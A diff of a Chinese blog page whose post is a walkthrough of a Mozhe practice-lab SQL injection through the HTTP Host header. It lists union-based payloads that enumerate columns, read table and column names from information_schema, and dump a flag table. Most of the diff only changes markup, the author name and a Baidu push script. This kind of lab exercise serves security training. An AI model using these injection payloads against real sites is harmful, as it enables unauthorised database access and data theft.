@@ -75,7 +75,7 @@
 <meta property="og:image" content="https://v2ray.dana5haw.com:8008/images/2020/04/13/image36d03060136ed58b.png">
 <meta property="article:published_time" content="2020-04-13T01:55:16.000Z">
 <meta property="article:modified_time" content="2021-08-06T03:41:13.950Z">
-<meta property="article:author" content="Dana Shaw">
+<meta property="article:author" content="肖坤稼">
 <meta property="article:tag" content="墨者靶场练习">
 <meta property="article:tag" content="host头部注入">
 <meta name="twitter:card" content="summary">
@@ -152,7 +152,8 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">为了去往别处</p>
+        <h1 class="site-subtitle" itemprop="description">为了去往别处</h1>
+      
   </div>
 
   <div class="site-nav-toggle">
@@ -227,9 +228,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -269,7 +268,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/./images/photo.jpg">
-      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="name" content="肖坤稼">
       <meta itemprop="description" content="连尘埃也想收藏">
     </span>
 
@@ -277,9 +276,9 @@
       <meta itemprop="name" content="Dana Shaw's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h2 class="post-title" itemprop="name headline">
           墨者靶场练习-host头部注入
-        </h1>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -343,27 +342,27 @@
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习host头部注入。</p>
 <p><escape> <span id="more"></span></escape></p>
-<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>开启<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/UWE3d3dJTWlmMDBYVUwvVFI0T2dmQT09bW96aGUmozhe">靶场</a><br>在host字段进行注入探测：<strong>存在sql注入</strong></p>
+<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>开启<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.mozhe.cn/bug/detail/UWE3d3dJTWlmMDBYVUwvVFI0T2dmQT09bW96aGUmozhe">靶场</a><br>在host字段进行注入探测：<strong>存在sql注入</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1=1</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1sMx"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image.png" alt="image.png"></a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1sMx"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image.png" alt="image.png"></a></p>
 <h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><strong>可判断有4个字段</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 4</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/12kS"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imagefda9dea6ce45947c.png" alt="imagefda9dea6ce45947c.png"></a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/12kS"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imagefda9dea6ce45947c.png" alt="imagefda9dea6ce45947c.png"></a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 5</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1O8G"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image2d1800fe6cf4a4cf.png" alt="image2d1800fe6cf4a4cf.png"></a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1O8G"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image2d1800fe6cf4a4cf.png" alt="image2d1800fe6cf4a4cf.png"></a></p>
 <h2 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h2><p><strong>可判断回显位置是2,3,4</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4--</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1biH"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imaged6fa300ddae6d45b.png" alt="imaged6fa300ddae6d45b.png"></a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1biH"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imaged6fa300ddae6d45b.png" alt="imaged6fa300ddae6d45b.png"></a></p>
 <h2 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h2><ul>
 <li>数据库名称、数据库版本、表名称<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--</span><br></pre></td></tr></table></figure>
 获取到的信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库名称：pentesterlab</span><br><span class="line">数据库版本：10.2.15-MariaDB-log</span><br><span class="line">表名称：comment,flag,goods,user</span><br></pre></td></tr></table></figure>
-<a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1qgf"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image4dd2667f53288eb2.png" alt="image4dd2667f53288eb2.png"></a></li>
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1qgf"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image4dd2667f53288eb2.png" alt="image4dd2667f53288eb2.png"></a></li>
 <li>获取表flag的信息<ul>
 <li>表有两列：id,flag<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)--</span><br></pre></td></tr></table></figure>
-<a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1yGj"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image5403eaa8f44b34d8.png" alt="image5403eaa8f44b34d8.png"></a></li>
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1yGj"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image5403eaa8f44b34d8.png" alt="image5403eaa8f44b34d8.png"></a></li>
 <li>表的内容：id=1,flag=flag is mozhe4a5966<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,id,flag from flag--</span><br></pre></td></tr></table></figure>
-<a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1FfQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imagefa4745c2daea3fd7.png" alt="imagefa4745c2daea3fd7.png"></a></li>
-<li>获取key<br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1SRu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image36d03060136ed58b.png" alt="image36d03060136ed58b.png"></a><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>参考这篇<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7f3f8cba465a">教程</a></li>
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1FfQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imagefa4745c2daea3fd7.png" alt="imagefa4745c2daea3fd7.png"></a></li>
+<li>获取key<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v2ray.dana5haw.com:8008/image/1SRu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image36d03060136ed58b.png" alt="image36d03060136ed58b.png"></a><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>参考这篇<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/7f3f8cba465a">教程</a></li>
 </ul>
 </li>
 </ul>
@@ -378,21 +377,21 @@
 <div>
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Dana Shaw
+    <strong>本文作者： </strong>肖坤稼
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     <a href="https://dana5haw.com/posts/ZH-CN/mozhe-host-inject.html" title="墨者靶场练习-host头部注入">https://dana5haw.com/posts/ZH-CN/mozhe-host-inject.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
   </li>
 
   <div class="wechat_OA">
 	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
 	<br>
     <!-- 这里添加你的二维码图片 -->
-	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+	<img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
 </div>
 
 </ul>
@@ -493,18 +492,17 @@
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="nav-number">4.</span> <span class="nav-text">判断字段回显位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-number">5.</span> <span class="nav-text">查询数据库信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
-        <div id="">
+        <div id>
 	  <canvas id="canvas" style="width:60%;">
-	    </div>
+	    </canvas></div>
 	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
       <!--/noindex-->
 
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
-      src="/./images/photo.jpg">
-  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+    <img class="site-author-image" itemprop="image" alt="肖坤稼" src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">肖坤稼</p>
   <div class="site-description" itemprop="description">连尘埃也想收藏</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -512,7 +510,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -532,13 +530,13 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
@@ -553,7 +551,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">windows提权学习</a>
         </li>
     </ul>
   </div>
@@ -600,7 +598,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+  <span class="author" itemprop="copyrightHolder">肖坤稼</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
@@ -614,7 +612,7 @@
 </div>
 
 
-  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script src="https://unpkg.com/mermaid@/dist/mermaid.min.js"></script>
   <script>
     if (window.mermaid) {
       mermaid.initialize({theme: 'default'});
@@ -656,7 +654,7 @@
 
   
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
@@ -679,6 +677,15 @@
 
 
   
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
 
 
 
@@ -735,15 +742,9 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
-     crossorigin="anonymous"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222" crossorigin="anonymous"></script>
 <!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-3938956891324222"
-     data-ad-slot="6163650450"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3938956891324222" data-ad-slot="6163650450" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -751,7 +752,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
   
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
    <script type="text/javascript" src="/js/fireworks.js"></script>
 
